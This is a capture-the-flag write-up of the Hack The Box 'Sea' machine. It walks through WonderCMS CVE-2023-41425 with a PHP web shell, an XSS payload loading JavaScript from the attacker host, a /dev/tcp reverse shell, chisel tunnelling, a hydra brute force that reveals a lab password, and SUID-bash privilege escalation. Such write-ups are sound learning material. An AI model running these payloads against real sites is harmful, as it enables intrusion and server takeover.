+++
title = 'Sea'
date = 2024-08-27T17:30:59-04:00
draft = true
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Easy"
+++

An easy linux HTB machine. Foothold involves some heavy enumeration and exploiting a XSS - CVE-2023-41425.
Escalation is a bit simpler but requires some port forwarding.

# Enum

## Port Scanning
```bash
┌──(fish㉿kali)-[~/htb/sea]
└─$ IP=10.10.11.28

┌──(fish㉿kali)-[~/htb/sea]
└─$ nmap -p- -T5 -oN all-ports.nmap $IP           
Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-26 11:04 EDT
Warning: 10.10.11.28 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.28
Host is up (0.025s latency).
Not shown: 65321 closed tcp ports (conn-refused), 212 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

┌──(fish㉿kali)-[~/htb/sea]
└─$ nmap -p22,80 -A -oN service-scan.nmap $IP  
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## 80/HTTP
```bash
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

![](/Screenshots/Sea_image_1.png)

Browsing to the site, we see it's running php and we also get a hostname `sea.htb`, we'll need to add this to our /etc/hosts file.

![](/Screenshots/Sea_image_2.png)

Easy way to add an entry to your hosts file:
```bash
echo '10.10.11.28 sea.htb' | sudo tee -a /etc/hosts
```

Next we can start enumerating directories and vhosts while we look at the file `contact.php`.

```bash
# gobuster directory enum
┌──(fish㉿kali)-[~/htb/sea]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t 50 -x php -b 404,403 -o gobuster-80.out  

# Vhost enumeration using ffuf, -fw filters by the number of words in a response.
┌──(fish㉿kali)-[~/htb/sea]
└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u $URL -H 'Host: FUZZ.sea.htb' -fw 582

```
![](/Screenshots/Sea_image_3.png)

No vhosts found this time. 

Gobuster results:
```bash
/contact.php          (Status: 200) [Size: 2731]
/data                 (Status: 301) [Size: 228] [--> http://sea.htb/data/]
/404                  (Status: 200) [Size: 3341]
/home                 (Status: 200) [Size: 3650]
/themes               (Status: 301) [Size: 230] [--> http://sea.htb/themes/]
/.                    (Status: 200) [Size: 3650]
/index.php            (Status: 200) [Size: 3650]
/messages             (Status: 301) [Size: 232] [--> http://sea.htb/messages/]
/0                    (Status: 200) [Size: 3650]
/plugins              (Status: 301) [Size: 231] [--> http://sea.htb/plugins/]

```


Looking at `contact.php`...
![](/Screenshots/Sea_image_4.png)

We can capture a response with burpsuite and examine it
![](/Screenshots/Sea_image_5.png)

The first thing that stands out to me is it asks for a website. Kind of a weird function but we can see if it uses this for any kind of functionality. Adding my tun0 IP as the website and setting up a nc listener shows it performs a web request. We might be able to leverage this as a SSRF.
![](/Screenshots/Sea_image_6.png)

![](/Screenshots/Sea_image_7.png)

No luck getting any kind of code execution from this. Timing is interesting as it's not directly after our initial web request but we get the hit on our server at random times after.

Looking at `index.php` source, we can enumerate the theme "bike". 
![](/Screenshots/Sea_image_8.png)

Running gobuster against the `bike/` directory to see if we can find anything interest.

```bash
┌──(fish㉿kali)-[~/htb/sea]
└─$ echo $URL                                   
http://sea.htb/themes/bike
...
┌──(fish㉿kali)-[~/htb/sea]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/quickhits.txt -t 50 -x php,md -b 404,403 -o gobuster-80.out 
...
/README.md            (Status: 200) [Size: 318]
/README.md            (Status: 200) [Size: 318]
/sym/root/home/       (Status: 200) [Size: 3650]
/version              (Status: 200) [Size: 6]
```

We can GET the README.md file and see if we can enumerate the CMs
http://sea.htb/themes/bike/README.md

![](/Screenshots/Sea_image_9.png)

Nice, so we found the site is running `WonderCMS`. Good reminder to keep enumerating as initially I went down the SSRF rabbit hole.

Checking version we find 3.2.0, not sure if it's the version of the theme `bike` or the cms.
![](/Screenshots/Sea_image_10.png)


A quick google shows us it's the version of wonderCMS and there's a CVE for this version
![](/Screenshots/Sea_image_11.png)
https://github.com/prodigiousMind/CVE-2023-41425 (Doesn't seem to work)

We need the login URL and it seems like wondercms tries to hide that for some reason. Looking at the docs for any hints. finds page navigation from index.php?page=`page`

https://github.com/WonderCMS/wondercms/wiki/Login-URL-doesn%27t-work---404

![](/Screenshots/Sea_image_12.png)

Some trial and error and noticing the docs referencing `loginurl` gets us the write URL >> `http://sea.htb/index.php?page=loginURL`. We can also just shorten this to `/loginURL`

![](/Screenshots/Sea_image_13.png)




---
# Foothold

We can use another exploit on github to get a shell and then get a reverse shell on the box. https://github.com/charlesgargasson/CVE-2023-41425

```bash
# Setting vars
RHOST="http://host.com:80"
LHOST="10.10.14.152"
LPORT="4444"
LPORTWEB="80"

# Moving to a tmp dir
cd $(mktemp -d)

# Creating our evil theme zip file
mkdir -p evil
cat <<'EOF'>evil/evil.php
<?=`$_GET[0]`;?>
EOF

zip -r evil.zip evil/

# JS payload that will install the new theme
cat <<EOF>xssrce.js
var xhr=new XMLHttpRequest();
xhr.open("GET", "${RHOST}/?installModule=http://${LHOST}:${LPORTWEB}/evil.zip&directoryName=whatever&type=themes&token=" + document.querySelectorAll('[name="token"]')[0].value, true);
xhr.send();
EOF
# Print XSS url
echo -e "\n# XSS RCE"
cat <<EOF
${RHOST}/index.php?page=loginURL?"></form><script+src="http://${LHOST}:${LPORTWEB}/xssrce.js"></script><form+action="
EOF
# Starting a new web server to serve payloads
sudo python3 -m http.server $LPORTWEB &
```

```bash
# id
CMD="id"
curl --path-as-is "${RHOST}/themes/evil/evil.php?0=$(echo -n "$CMD"| python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))")"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell, (don't forget to listen first: nc -nvlp 4444)
CMD="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
curl --path-as-is "${RHOST}/themes/evil/evil.php?0=$(echo -n "$CMD"| python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))")"
```


I used the above as a template to create my own python script >> https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE

Basic steps to exploit the vulnerability are:
1. Create a php shell file and zip it within a `shell/` directory.
2. Create and host a javascript file to install our zipped shell directory utilizing `installModule`.
3. Host the shell file on a python server
4. If you have admin access to the CMS you can just click the XSS payload, if not you have to get someone who does to click the XSS URL.
6. Hit the URL where our command shell is "installed" for command injection.


![](/Screenshots/Sea_image_14.png)

WonderCMS stores an encrypted password in data/database.js
![](/Screenshots/Sea_image_15.png)

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```


I attempted to use hashcat to crack the password but wasn't having any luck. Not quite sure why.


There's two other user's on the host:
![](/Screenshots/Sea_image_16.png)

Two user's dirs found in `/home`  `amay` and `geo`
![](/Screenshots/Sea_image_17.png)

User.txt is in /home/amay so we'll likely need to to pivot to `amay`.

Listing connections finds the box is listening on port 8080 locally.

![](/Screenshots/Sea_image_18.png)

We can set up a reverse port forward using chisel to view the web page in our local browser.

```bash
# on attack box
┌──(fish㉿kali)-[~/htb/sea]
└─$ ./chisel_arm server --reverse --port 1080

# On victim
www-data@sea:/tmp$ ./chisel_amd client 10.10.14.7:1080 R:8001:127.0.0.1:8080
2024/08/27 17:55:49 client: Connecting to ws://10.10.14.7:1080
2024/08/27 17:55:49 client: Connected (Latency 24.188706ms)

```


We can browse to the site  on our attack box at http://127.0.0.1:8001 

![](/Screenshots/Sea_image_19.png)

We can try and brute force the password with hydra, added both `amay` and `geo` to the file `user.txt` and sent it.

```bash
┌──(fish㉿kali)-[~/htb/sea]
└─$ hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f localhost http-get -s 8001 
```

![](/Screenshots/Sea_image_20.png)
and we have a match! We get the password for `amay:mychemicalromance`.

![](/Screenshots/Sea_image_21.png)


And we see `amay` used the same password for the system as we're able to login via SSH

![](/Screenshots/Sea_image_22.png)

We can get that user.txt file now.

![](/Screenshots/Sea_image_23.png)



## Exploits
https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE

--- 
# PrivEsc

Looking at the functionality of the web app on `127.0.0.1:8000`, guessing we might be able to abuse it as we can use it to read the `auth.log` and `access.log` files. These files generally require higher than  privileges to access.

![](/Screenshots/Sea_image_24.png)

We can proxy a request through burpsuite with curl to get a better idea of what's going on:
```bash
┌──(fish㉿kali)-[~/htb/sea]
└─$ curl -v --proxy 127.0.0.1:8080 -u amay:mychemicalromance localhost:8001 
```

We can view the contents of the log with a post request. Notice the "No suspicious traffic..."

![](/Screenshots/Sea_image_25.png)

Checking to see if we can see other files with the classic `/etc/passwd`
![](/Screenshots/Sea_image_26.png)

Looks like we can include a pipe within our log file param. This allows us to pipe a file to bash, executing it. Trying this with a reverse shell doesn't work as for some reason the process is killed quickly.

Instead lets modify the permissions for an executable.

We can use this to change the perms for the bash executable and get root with the following:
```bash
amay@sea:/tmp$ cat rev.sh 
#![](bin/bash
chmod u+s /bin/bash
```

Then when we perform our post request we can see the SUID bit is set on bash.

![](/Screenshots/Sea_image_27.png)


![](/Screenshots/Sea_image_28.png)

We can change our EUID to root with a quick command found on https://gtfobins.github.io/gtfobins/bash/#suid


![](/Screenshots/Sea_image_29.png)

And we're done, we see our euid=0 making us effectively root! We can go and grab the root flag, submit it, and call it a day.



